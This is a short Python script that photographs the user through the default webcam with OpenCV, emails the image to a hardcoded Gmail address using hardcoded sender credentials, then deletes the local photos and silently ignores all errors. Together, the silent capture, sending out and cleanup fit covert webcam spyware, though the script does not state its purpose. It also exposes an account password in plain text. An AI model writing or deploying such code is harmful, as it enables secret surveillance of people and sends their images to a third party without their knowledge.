import cv2
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

image_list = []
sender = 'qwerty1133311@gmail.com'
sender_password = 'qwerty11333'
receiver = 'budonuy1997@gmail.com'

def make_capture():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    img_name = "{}.png".format(time.ctime().replace(' ', '_'))
    cv2.imwrite(img_name, frame)
    image_list.append(img_name)
    print("Made photo {}".format(img_name))
    cam.release()
    cv2.destroyAllWindows()
    return img_name

def send_email(img_name):
    msgRoot = MIMEMultipart('related')
    msgRoot['From'] = sender
    msgRoot['To'] = receiver
    msgRoot['Subject'] = 'Any subject'
    msgText = MIMEText('<br "><img src="cid:image1" height="400px"><br>', 'html')
    msgRoot.attach(msgText)

    fp = open(img_name, 'rb')
    msgImage = MIMEImage(fp.read())
    fp.close()

    msgImage.add_header('Content-ID', '<image1>')
    msgRoot.attach(msgImage)

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(sender, sender_password)
    server.sendmail(sender, [receiver], msgRoot.as_string())

    print('Email sent to'.format(receiver))
    server.quit()

def delete_photos():
    for photo in image_list:
        os.remove(photo)

if __name__ == '__main__':
    try:
        for i in range(1):
            img_name = make_capture()
            send_email(img_name)
        delete_photos()
    except:
        pass

